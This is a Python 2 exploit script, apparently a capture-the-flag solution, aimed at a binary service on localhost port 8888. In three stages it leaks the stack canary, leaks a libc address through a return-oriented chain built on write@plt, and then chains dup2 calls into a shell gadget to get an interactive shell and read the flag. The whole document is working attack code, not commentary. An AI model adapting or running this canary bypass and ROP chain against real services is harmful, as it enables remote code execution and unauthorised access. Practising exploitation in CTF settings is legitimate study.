from socket import *
from struct import *
import telnetlib
import time
import sys

def recv_until(s, data):
	buf = ""
	while True:
		c = s.recv(1)
		buf += c
		if data in buf:
			break
	return buf

def remote_debug(flag):
    if(flag == True):
        print"[+] Remote debugging mode"
        time.sleep(10)
        raw_input("Dbg is ready?")

host = 'localhost'
port = 8888

s = socket( AF_INET, SOCK_STREAM )
s.connect((host,port))

if len(sys.argv) == 2:
	remote_debug(True)
else:
	remote_debug(False)

# STAGE 1: Leak canary
s.send("4\x00\x00\x00")
s.send("y"*11)

recv_until(s, "y"*11)

canary = "\x00" + s.recv(3)
canary = unpack("<L",canary)[0]
print "[+] Leaked canary: " + hex(canary)

s.close()

# STAGE 2: Leak libc base
s = socket( AF_INET, SOCK_STREAM )
s.connect((host,port))

read_plt = 0x8048620
write_plt = 0x80486e0
write_got = 0x804b040
pppr = 0x8048b2c
ppr = 0x8048b2d
bss = 0x804b1a0

payload = ""
payload += "A"*10		# dummy buffer
payload += pack("<L",canary)	# restore canary
payload += "B"*8		# dummy
payload += "BBBB"		# sfp

payload += pack("<L", write_plt)
payload += pack("<L", pppr) 
payload += pack("<L", 4) 
payload += pack("<L", write_got)
payload += pack("<L", 4)

s.send("4\x00\x00\x00")
s.send(payload + "\x00"*(110-len(payload)))

recv_until(s,"Are you sure? (y/n) ")
write_addr = unpack("<L",s.recv(4))[0]
print "[+] write addr: " + hex(write_addr)

#write_offset = 0xdefa0
write_offset = 0xdac50
libc_base = write_addr - write_offset
print "[+] libc base: " + hex(libc_base)

s.close()

# STAGE 3: exploit!
s = socket( AF_INET, SOCK_STREAM )
s.connect((host,port))

#dup2_offset = 0xdf8b0
dup2_offset = 0xdb590 
dup2_addr = libc_base + dup2_offset

payload = ""
payload += "A"*10		# dummy buffer
payload += pack("<L",canary)	# restore canary
payload += "B"*8		# dummy
payload += "BBBB"		# sfp

payload += pack("<L", dup2_addr)
payload += pack("<L", ppr) 
payload += pack("<L", 4) 
payload += pack("<L", 1)

payload += pack("<L", dup2_addr)
payload += pack("<L", ppr) 
payload += pack("<L", 4) 
payload += pack("<L", 0)

# exec shell 
payload += pack("<L", 0x8048C62)

s.send("4\x00\x00\x00")
s.send(payload + "\x00"*(110-len(payload)))

recv_until(s, "Are you sure? (y/n) ")
print "[+] You got a shell!"

print "[+] Exec cat flag!!"
s.send("cat flag\n")

try:
        t = telnetlib.Telnet()
        t.sock = s
        t.interact()
        t.close()
except KeyboardInterrupt:
        pass


